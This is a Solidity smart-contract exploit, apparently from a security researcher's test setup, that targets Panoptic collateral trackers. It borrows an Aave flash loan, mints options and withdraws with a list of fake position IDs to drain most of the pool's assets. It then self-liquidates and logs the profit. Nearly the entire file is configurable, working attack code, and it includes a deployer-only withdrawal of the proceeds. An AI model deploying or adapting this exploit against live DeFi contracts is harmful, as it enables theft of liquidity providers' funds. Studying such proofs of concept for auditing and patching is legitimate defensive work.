// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

// NOTE: Not using this for now, it gets a revert when trying to take the flash loan from Aave

import { console } from "forge-std/Test.sol";

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";

contract ConfigurablePanopticAttacker is IFlashLoanReceiver {
    // State variables
    IERC20Partial token0;
    IERC20Partial token1;
    IUniswapV3Pool uniPool;
    IAAVELendingPool aavePool;
    ICollateralTracker tracker0;
    ICollateralTracker tracker1;
    IPanopticPool pp;
    ISFPM sfpm;
    TokenId[] firstRealPosition;
    TokenId[] twoRealPositions;
    uint256[] fakePositionUints;

    int24 internal constant MIN_V3POOL_TICK = -887272;
    int24 internal constant MAX_V3POOL_TICK = 887272;

    // Store deployer for access control
    address private immutable deployer;

    /**
     * @dev Constructor to set token addresses
     * @param _token0 Address of token0 (use address(0) for native ETH)
     * @param _token1 Address of token1
     * @param _uniPool Address of Uniswap V3 pool
     * @param _aavePool Address of AAVE lending pool
     * @param _collateral0 Address of collateral tracker for token0
     * @param _collateral1 Address of collateral tracker for token1
     * @param _panopticPool Address of Panoptic pool
     * @param _sfpm Address of SFPM
     */
    constructor(
        address _token0,
        address _token1,
        address _uniPool,
        address _aavePool,
        address _collateral0,
        address _collateral1,
        address _panopticPool,
        address _sfpm,
        TokenId[] memory _firstRealPosition,
        TokenId[] memory _twoRealPositions,
        uint256[] memory _fakePositionUints
    ) {
        deployer = msg.sender;

        // If token0 is ETH, use WETH address for internal operations
        token0 = IERC20Partial(_token0);
        token1 = IERC20Partial(_token1);

        // Set pool addresses (use defaults if not provided)
        uniPool = IUniswapV3Pool(_uniPool);
        aavePool = IAAVELendingPool(_aavePool);
        tracker0 = ICollateralTracker(_collateral0);
        tracker1 = ICollateralTracker(_collateral1);
        pp = IPanopticPool(_panopticPool);
        sfpm = ISFPM(_sfpm);

        firstRealPosition = _firstRealPosition;
        twoRealPositions = _twoRealPositions;
        fakePositionUints = _fakePositionUints;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function createFakeTokenList(uint256[] memory fake_token_uints) internal pure returns (TokenId[] memory) {
        TokenId[] memory fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length; i++) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
        }
        return fakeTokenIdList;
    }

    function liquidateSelf(TokenId[] memory realPosIdList) internal {
        TokenId[] memory emptyTokenList = new TokenId[](0);
        // TODO: Check if this call is the same in v1 and v1.1 - but i'm pretty sure it is
        pp.liquidate(emptyTokenList, address(this), realPosIdList);
    }

    /**
     * @dev Modifier to restrict access to deployer only
     */
    modifier onlyDeployer() {
        require(msg.sender == deployer, "Only deployer can call this function");
        _;
    }

    /**
     * @dev Receive function to accept ETH
     */
    receive() external payable {}

    /**
     * @dev Fallback function
     */
    fallback() external payable {}

    /**
     * @dev Withdraw tokens from the contract (only deployer)
     * @param tokenAddress Address of the token to withdraw (use address(0) for ETH)
     * @param amount Amount to withdraw
     */
    function withdraw(address tokenAddress, uint256 amount) external onlyDeployer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(deployer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(deployer, amount); // revert if token transfer fails
        }
    }

    // TODO: Make this method handle native eth as token0
    function takeFlashLoanAndAttack() public {
        uint256 initialAssets0 = token0.balanceOf(address(this));
        uint256 initialAssets1 = token1.balanceOf(address(this));
        console.log("<<<< BEFORE ATTACK: initial token 0 balance: ", initialAssets0);
        console.log("<<<< BEFORE ATTACK: initial token 1 balance: ", initialAssets1);

        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();

        uint256 LEN = 2;
        address[] memory addresses = new address[](LEN);
        uint256[] memory amounts = new uint256[](LEN);
        uint256[] memory modes = new uint256[](LEN);

        addresses[0] = address(token0);
        amounts[0] = (5 * poolAssets0) / 4; // borrow 125% of the pool assets
        modes[0] = 0;

        addresses[1] = address(token1);
        amounts[1] = (5 * poolAssets1) / 4; // borrow 125% of the pool assets
        modes[1] = 0;

        // TODO: Why revert here?
        aavePool.flashLoan(address(this), addresses, amounts, modes, address(this), bytes(""), 0);

        console.log("----------- After paying back the flash loan -----------");
        uint256 finalAssets0 = token0.balanceOf(address(this));
        uint256 finalAssets1 = token1.balanceOf(address(this));

        uint256 ETH_PRICE = 4_200; // 1 ETH = 4_200 USDC
        uint256 finalProfit = finalAssets0 + ((finalAssets1 * ETH_PRICE) * 1e6) / 1e18;

        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 0 balance: ", finalAssets0);
        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 1 balance: ", finalAssets1);
        console.log(
            "<<<< AFTER PAYING FLASH LOAN: Total profit on Mainnet (in USDC) at 1 ETH = 4_200e18 USDC: %s",
            finalProfit
        );
        console.log("--------------------------------------------------------");
    }

    // This function is called by the flash loan provider
    // We use it to execute our attack logic after taking a flash loan
    function executeOperation(
        address[] calldata, // assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator,
        bytes calldata // params
    ) public returns (bool) {
        console.log("<<<< ATTACKER: executeOperation() called");

        // Phase 1: Drain the pool
        phase1Attack();

        // Phase 2: buy options and then drain pool (not implemented in this example)
        // TODO: Could implement this

        // pay back the flash loan
        // TODO: Handle native eth as token0 here
        token0.approve(address(aavePool), amounts[0] + premiums[0]);
        token1.approve(address(aavePool), amounts[1] + premiums[1]);

        return true;
    }

    function phase1Attack() public {
        // TODO: Make number of drainPool calls configurable in constructor
        drainPool(); // takes 1/2             = 1/2 of s_poolAssets
        drainPool(); // takes 1/2 + 1/4       = 3/4 of s_poolAssets
        /* drainPool(); // takes 1/2 + 1/4 + 1/8 = 7/8 of s_poolAssets */
        // ... gas is the limit here, could do 1 more round
    }

    function drainPool() public {
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            console.log("I am contract: ", address(this));
            console.log("USDC Pool Assets: ", poolAssets0);
            console.log("WETH Pool Assets: ", poolAssets1);
        }

        console.log("------------------------");

        // drain the pool

        // - deposit funds

        // TODO: Handle native eth for each token0.balanceOf call in this method
        uint256 myAssets0 = token0.balanceOf(address(this));
        uint256 myAssets1 = token1.balanceOf(address(this));

        // as much as I can extract in one go
        uint128 attackAmount0 = uint128(
            min((token0.balanceOf(address(this)) * 80) / 100, (poolAssets0 / 2))
        ); // 20% margin to pay for the options, fees, etc.
        uint128 depositAmount0 = (attackAmount0 * 120) / 100;

        // as much as I can extract in one go
        uint128 attackAmount1 = uint128(
            min((token1.balanceOf(address(this)) * 80) / 100, (poolAssets1 / 2))
        ); // 20% margin to pay for the options, fees, etc.
        uint128 depositAmount1 = (attackAmount1 * 120) / 100;

        {
            console.log("my initial token 0 balance: ", myAssets0);
            console.log("my initial token 1 balance: ", myAssets1);

            console.log("------------------------");
            console.log("Starting attack to draining the pool...");
            console.log("Depositing funds...");

            token0.approve(address(tracker0), type(uint104).max);
            console.log("my initial tracker0 share balance: ", tracker0.balanceOf(address(this)));

            token1.approve(address(tracker1), type(uint104).max);
            console.log("my initial tracker1 share balance: ", tracker1.balanceOf(address(this)));

            uint myNewShares0 = tracker0.deposit(depositAmount0, address(this));
            uint myNewShares1 = tracker1.deposit(depositAmount1, address(this));
            console.log("tracker0 share balance from deposit(): ", myNewShares0);
            console.log("tracker1 share balance from deposit(): ", myNewShares1);
        }

        // - mint ITM options

        // value used for calculating fake list
        console.log("minting options with (1 leg) pos0 = ", TokenId.unwrap(firstRealPosition[0]));
        console.log("tracker0 total assets:          ", tracker0.totalAssets());
        console.log("tracker0 total (shares) supply: ", tracker0.totalSupply());

        console.log("tracker0 my share balance: ", tracker0.balanceOf(address(this)));

        // TODO: Possibly have a v1.1 flag in constructor, and use differnet mintOptions call if necessary? Not sure if this was the same in v1 VS v1.1
        pp.mintOptions(
            firstRealPosition, // positionIdList
            attackAmount0, // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        console.log("minting options with (1 leg) pos1 = ", TokenId.unwrap(twoRealPositions[1]));
        console.log("tracker1 total assets:          ", tracker1.totalAssets());
        console.log("tracker1 total (shares) supply: ", tracker1.totalSupply());

        console.log("tracker1 my share balance: ", tracker1.balanceOf(address(this)));

        pp.mintOptions(
            twoRealPositions, // positionIdList
            attackAmount1, // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list
        console.log("Withdrawing with fake positions...");

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = createFakeTokenList(fakePositionUints);

        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        console.log("our token0 share balance: ", intermediateBalance0);
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);

        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        console.log("our token1 share balance: ", intermediateBalance1);
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);

        console.log("------------------------");
        console.log("my final token 0 balance: ", token0.balanceOf(address(this)));
        console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
        console.log("------------------------");

        // now liquidate my own position and repeat...
        liquidateSelf(twoRealPositions);
    }
}
